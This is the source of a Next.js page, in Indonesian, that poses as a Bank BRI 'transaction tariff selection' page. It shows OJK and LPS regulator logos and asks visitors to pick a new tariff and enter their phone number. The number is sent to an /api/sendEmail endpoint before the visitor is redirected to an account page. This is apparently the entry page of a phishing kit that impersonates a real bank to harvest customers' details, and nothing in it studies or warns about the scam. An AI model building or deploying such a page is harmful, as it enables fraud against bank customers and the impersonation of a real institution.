import React, { useState } from 'react'
import Image from 'next/image'

import banner from "../public/poster.gif"
import ojk from "../public/ojk.png"
import lps from "../public/lps.png"
import { useRouter } from 'next/router'
import { BsFillTelephoneFill } from 'react-icons/bs'
import App from 'next/app'


function Home({host}) {
    const [data, setData] = useState({})
    const [disbledBtn, setDisbledBtn] = useState(true)

    const router = useRouter()

    const handleChange = (e) => {
        setData({
            ...data, 
            [e.target.name]: e.target.value
        })

        if(e.target.value){
            setDisbledBtn(false)
        } else {
            setDisbledBtn(true)
        }
    }

    const handleSubmit = async (e) => {
        e.preventDefault()
        const checked = document.getElementById('tarif').value

        localStorage.setItem('noHp', data.nomorhandphone)

        if (checked > 0) {
            document.getElementById('btn').innerHTML = 'Loading...'
            try {
                
                const response = await fetch('/api/sendEmail', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'url': host
                    },
                    body: JSON.stringify(data)
                })

                const json = await response.json()
                
                if (json.status === 200) {
                    document.getElementById('btn').innerHTML = 'Lanjut Aktivasi'
                    router.push('/akun')

                } else{
                    document.getElementById('btn').innerHTML = 'Lanjut Aktivasi'
                    console.log(json.error)
                }

            } catch (error) {
                document.getElementById('btn').innerHTML = 'Lanjut Aktivasi'
                console.log(error.message);
            }
        }

        return
    }
    return (
        <div className="container">
            <div className='container-flex'>
                <div style={{margin:'0 10px'}}>
                    <Image src={banner} height={400} alt="logo" />              
                </div>
                <div className='card'>
                  <h5 style={{textAlign:'center', color:'rgb(14 120 202)', fontWeight:'bolder', fontSize:24, marginBottom: 3, marginTop:20}}>SELAMAT DATANG</h5>
                  <p style={{width:'90%', margin:'0 auto', textAlign:'center', color:'rgb(14 120 202)', fontWeight:'bolder', fontSize:14}}>Anda Berada Di Halaman Pemilihan Tarif Transaksi Bank BRI. Silahkan Pilih Tarif Transaksi Yang Anda Inginkan, Sesuai Dengan Kebutuan Anda</p>
                  <div style={{margin:'20px'}}>
                      <form onSubmit={handleSubmit}>
                          <label htmlFor='tarif' style={{color:'rgb(14 120 202)', fontWeight:'bolder', fontSize:13}}>Silahkan Pilih Tarif Di Bawa ini</label>
                          <select id="tarif" className='form-control' style={{padding:10, border: '0.5px solid rgb(157, 199, 231)'}}>
                            <option value="0">Pilih Tarif (Klik disini)</option>
                            <option value="1">TARIF LAMA Rp6.500 Pertransaksi</option>
                            <option value="2">TARIF BARU Rp150.000 Perbulanan Unlimited</option>
                          </select>
                          <div className="form-group" style={{marginTop:20}}>
                            <input type="number" className='form-control' placeholder='No Handphone' onChange={handleChange} name="noHp" required/>
                            <BsFillTelephoneFill className='icon-control'/>
                        </div>
                          <button disabled={disbledBtn} type='submit' className='btn' id='btn' style={{cursor:'pointer', fontWeight:'normal', wordSpacing:2, borderRadius:4}}>
                              Lanjut Aktivasi
                          </button>
                      </form>
                  </div>
                </div>
                <div style={{margin:'10px auto', display:'flex'}}>
                    <Image src={lps} width={100} height={50} alt="logo" />             
                    <Image src={ojk} width={100} height={50} alt="logo" />             
                </div>
            </div>
        </div>
    )
}

export default Home

export async function getServerSideProps(context) {

    const host = context.req.headers.host
    
    return {
      props: {
        host
      },
    }
  }